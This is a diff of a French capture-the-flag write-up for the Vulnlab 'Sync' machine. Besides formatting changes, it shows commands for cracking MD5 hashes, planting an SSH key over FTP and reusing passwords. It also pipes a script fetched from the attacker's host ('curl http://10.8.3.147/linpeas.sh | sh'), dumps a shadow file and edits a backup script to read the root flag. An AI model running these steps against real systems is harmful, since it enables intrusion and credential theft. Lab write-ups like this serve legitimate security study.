@@ -1,24 +1,26 @@
 ---
-title: Sync - Easy
-description: WU Sync - Easy
+title: Sync
+description: WU Sync
 categories: [Writeup]
 tags: [writeup]
 template: doc
+sidebar:
+  order: 6
+  badge:
+    text: 'medium'
+    variant: caution
 ---
+
 import { Image } from 'astro:assets';
 import banner from '../../../../assets/writeup/vulnlab/banner.jpeg';
 
 <Image src={banner} alt="banner" format="avif" quality={"mid"}/>
 
-
 # SYNC
-
 
 | OS | Difficulty | Target |
 |----|----|----|
 | Linux | <span style="color:green">**EASY**</span> | 10.10.124.199 |
-
-
 
 # 🔭 Enumeration
 
@@ -49,6 +51,7 @@ PORT    STATE SERVICE VERSION
 873/tcp open  rsync   (protocol version 31)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
 Le port 80 permet d'afficher une page de login avec username/password.
 Le port 21 ne semble pas être configurer pour se connecter en `anonymous`.
 Le port 873, `RSYNC` nous permet d'obtenir quelques informations:
@@ -70,6 +73,7 @@ drwxr-xr-x          4,096 2023/04/20 22:13:15 www
 # Téléchargeons le contenu
 rsync -r 10.10.124.199::httpd/ .
 ```
+
 Le fichier `www/index.php` contient un hash:
 
 ```php
@@ -81,6 +85,7 @@ Le fichier `www/index.php` contient un hash:
      exit();
  }
 ```
+
 La `db` nous donne quelques informations complémentaires:
 
 ```sqlite
@@ -105,9 +110,11 @@ COMMIT;
 On obtient deux users `triss` et `admin`.
 
 En retournant dans le fichier `index.php` il est clairement affiché que la vérification de la combinaison user/password est comme ceci:
+
 ```php
 $hash = md5("$secure|$username|$password");
 ```
+
 Utilisons `Hashcat` pour tenter de déchiffrer les mots de passes.
 Pour que le hash soit accepté par `hashcat` voici le format de fichier: `<HASH_DB>:<HASH_SECURE>|<user>|`
 
@@ -136,6 +143,7 @@ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.124.199' (ED25519) to the list of known hosts.
 triss@10.10.124.199: Permission denied (publickey).
 ```
+
 `ssh` vérifie les clés présentes. Passons par le `ftp`.
 
 Via le ftp nous sommes dans un dossier `/home`:
@@ -153,6 +161,7 @@ lrwxrwxrwx    1 0        0               9 Apr 21  2023 .bash_history -> /dev/nu
 ```
 
 Nous générons une paire de clé ssh et nous importons la clé publique que nous renommons `authorized_keys`
+
 ```sh
 ftp> mkdir .ssh
 257 "/.ssh" created
@@ -179,8 +188,6 @@ triss@ip-10-10-200-238:/home$ cd jennifer
 -bash: cd: jennifer: Permission denied
 ```
 
-
-
 # 👣 Foothold
 
 Connecté en ssh avec `Triss`, nous ne pouvons rien faire. Nous décidons de tenter avec le même mot de passe de nous connecté à `sa`, `ubuntu` et `jennifer`.
@@ -193,6 +200,7 @@ user.txt
 ```
 
 A partir de ce moment, nous décidons de lancer `Linpeas` pour obtenir plus d'informations sur d'éventuelles vulnérabilités exploitables.
+
 ```sh
 [...]
 curl http://10.8.3.147/linpeas.sh | sh
@@ -205,6 +213,7 @@ curl http://10.8.3.147/linpeas.sh | sh
 -rwxr-xr-x 1 sa sa 211 Apr 19  2023 /usr/local/bin/backup.sh
 [...]
 ```
+
 Nous avons donc un dossier `/backup` à la racine et un script `backup.sh`appartenant à `sa`.
 
 # 🔄 Lateral Movement
@@ -264,7 +273,9 @@ Archive:  1726994641.zip
   inflating: tmp/backup/passwd       
   inflating: tmp/backup/shadow       
 ```
+
 Intéressant, le backup possède le fichier `shadow`.
+
 ```sh
 jennifer@ip-10-10-200-238:/tmp/tmp/backup$ cat shadow
 root:$y$j9T$Lvn5CBDJCop7JR9iMerFr1$dfzHPNhyy1jkree7XtvuxhyYziUbVC.W5ltk7CTFJKA:19466:0:99999:7:::
@@ -339,6 +350,7 @@ sa@ip-10-10-200-238:/tmp/tmp/backup$ sudo -l
 Sorry, user sa may not run sudo on ip-10-10-200-238.
 sa@ip-10-10-200-238:/tmp/tmp/backup$ vim /usr/bin/backup.sh
 ```
+
 Le script montre une succession de commandes en copiant plusieurs fichiers, puis en archivant ce dernier et supprimant les dossiers `/tmp/backup`:
 
 ```sh backup.sh
@@ -357,7 +369,9 @@ Nous supprimons la dernière ligne et la remplaçons par ceci:
 ```sh
 cat /root/root.txt >/tmp/flag.txt
 ```
+
 Puis nous exécutons le script. Malgré l'erreur de la commande `cat` la copy du fichier `root.txt` a bel et bien été effectué.
+
 ```sh
 sa@ip-10-10-200-238:/tmp/backup$ bash /usr/local/bin/backup.sh
 cat: /root/root.txt: Permission denied
